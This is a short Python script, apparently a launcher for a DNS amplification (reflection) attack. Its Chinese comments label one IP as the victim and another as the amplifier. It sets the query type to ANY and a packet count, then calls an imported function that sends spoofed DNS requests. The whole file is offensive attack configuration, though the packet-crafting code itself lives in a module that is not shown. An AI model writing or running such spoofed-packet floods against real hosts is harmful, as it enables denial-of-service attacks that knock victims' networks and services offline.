#!/usr/bin/python3
# -*- coding: utf-8 -*-

from send_pkt import start_send_spoof_pkt

src_ip = '10.180.177.167' # 被攻击者地址
dst_ip = '10.6.39.2' # 放大器地址
query_type = 'ANY' # DNS请求类型
packet_number = 100 # 发送请求包数量

start_send_spoof_pkt(src_ip, dst_ip, query_type, packet_number)
